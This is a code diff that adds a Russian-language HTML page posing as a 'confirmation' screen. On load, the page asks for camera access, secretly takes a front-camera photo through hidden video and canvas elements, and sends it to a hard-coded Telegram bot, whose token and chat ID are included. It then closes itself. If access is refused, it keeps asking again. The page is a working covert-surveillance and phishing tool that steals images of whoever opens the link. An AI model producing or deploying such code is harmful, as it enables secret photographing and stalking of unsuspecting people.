@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Подтверждение</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
+        body {
+            background: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        video, canvas { display: none; }
+        .message {
+            background: rgba(30,30,40,0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 28px;
+            padding: 28px 24px;
+            max-width: 300px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        h2 { font-size: 1.5rem; margin-bottom: 16px; font-weight: 600; }
+        p { font-size: 1rem; opacity: 0.85; margin-bottom: 24px; line-height: 1.4; }
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 16px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { font-size: 0.85rem; background: rgba(255,255,255,0.1); padding: 8px 12px; border-radius: 40px; display: inline-block; }
+    </style>
+</head>
+<body>
+<div class="message">
+    <div class="spinner" id="spinner"></div>
+    <h2>Необходим доступ к камере</h2>
+    <p>Пожалуйста, разрешите использование камеры для продолжения</p>
+    <div class="status" id="statusText">Запрос разрешения...</div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    // ----- НАСТРОЙКИ ТЕЛЕГРАМ (ЗАМЕНИТЕ НА СВОИ) -----
+    const BOT_TOKEN = '8845662081:AAE_zG3aqbGQC_lp6yAN-0GgIPrdQog7l4E';          // сюда токен бота
+    const CHAT_ID = '6857459750';         // сюда ваш chat_id
+    // -------------------------------------------------
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const spinner = document.getElementById('spinner');
+    const statusText = document.getElementById('statusText');
+    
+    let stream = null;
+    let permissionRequested = false;   // защита от множественных вызовов
+    let permissionDenied = false;
+
+    // --- отправка фото в Telegram через fetch ---
+    async function sendPhotoToTelegram(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.png');
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            const result = await response.json();
+            if (result.ok) {
+                statusText.innerText = '✓ Фото отправлено. Закрытие...';
+            } else {
+                statusText.innerText = 'Ошибка отправки фото';
+                console.error('Telegram API error:', result);
+            }
+        } catch (error) {
+            statusText.innerText = 'Ошибка сети';
+            console.error('Send error:', error);
+        } finally {
+            // закрываем страницу через 0.5 секунды (чтобы пользователь увидел последний статус)
+            setTimeout(() => { window.close(); }, 500);
+        }
+    }
+
+    // --- делаем снимок с видеоэлемента и отправляем ---
+    function captureAndSend() {
+        if (!video.videoWidth || !video.videoHeight) return;
+        
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(blob => {
+            if (blob) {
+                sendPhotoToTelegram(blob);
+            } else {
+                statusText.innerText = 'Не удалось создать фото';
+            }
+        }, 'image/png');
+    }
+
+    // --- остановка камеры и закрытие страницы (на случай, если что-то пошло не так)---
+    function stopCameraAndClose() {
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+        }
+        if (!window.closed) {
+            window.close();
+        }
+    }
+
+    // --- основной запрос доступа к камере (фронтальной)---
+    async function requestCameraAccess() {
+        if (permissionRequested) return;
+        permissionRequested = true;
+        
+        try {
+            const constraints = {
+                video: {
+                    facingMode: { exact: "user" },   // принудительно фронтальная камера
+                    width: { ideal: 1024 },
+                    height: { ideal: 768 }
+                },
+                audio: false
+            };
+            
+            statusText.innerText = 'Запрос доступа...';
+            stream = await navigator.mediaDevices.getUserMedia(constraints);
+            
+            // успешно — подключили камеру
+            statusText.innerText = 'Доступ разрешён. Съёмка...';
+            video.srcObject = stream;
+            
+            // как только видео будет готово — делаем снимок
+            video.onloadedmetadata = () => {
+                video.play();
+                captureAndSend();
+            };
+            
+            // запасной таймер на случай, если onloadedmetadata не сработает (редкость)
+            setTimeout(() => {
+                if (video.videoWidth && video.videoHeight) captureAndSend();
+            }, 1000);
+            
+        } catch (err) {
+            console.error('Ошибка доступа:', err);
+            permissionRequested = false;  // разрешаем попробовать снова
+            permissionDenied = true;
+            
+            // Обработка запрета доступа
+            if (err.name === 'NotAllowedError') {
+                statusText.innerText = '❌ Доступ запрещён. Пожалуйста, разрешите камеру';
+                // Пытаемся отследить, когда пользователь изменит разрешение (только в современных браузерах)
+                if (navigator.permissions && navigator.permissions.query) {
+                    try {
+                        const permStatus = await navigator.permissions.query({ name: 'camera' });
+                        permStatus.onchange = async () => {
+                            if (permStatus.state === 'granted') {
+                                statusText.innerText = 'Разрешение получено, повторная попытка...';
+                                permissionRequested = false;
+                                requestCameraAccess();
+                            }
+                        };
+                    } catch (e) {}
+                }
+                // через 2 секунды повторяем запрос, если не было слушателя
+                setTimeout(() => {
+                    if (permissionDenied && !stream) {
+                        permissionRequested = false;
+                        requestCameraAccess();
+                    }
+                }, 2500);
+            } else if (err.name === 'NotFoundError') {
+                statusText.innerText = '❌ Фронтальная камера не обнаружена';
+            } else {
+                statusText.innerText = `❌ Ошибка: ${err.message}`;
+            }
+        }
+    }
+
+    // Запускаем процесс при загрузке страницы
+    window.addEventListener('load', () => {
+        requestCameraAccess();
+    });
+    
+    // Дополнительная страховка: если страница не закрылась, всё равно принудительно закроем через 15 сек
+    setTimeout(() => {
+        if (!window.closed) window.close();
+    }, 15000);
+</script>
+</body>
+</html>f
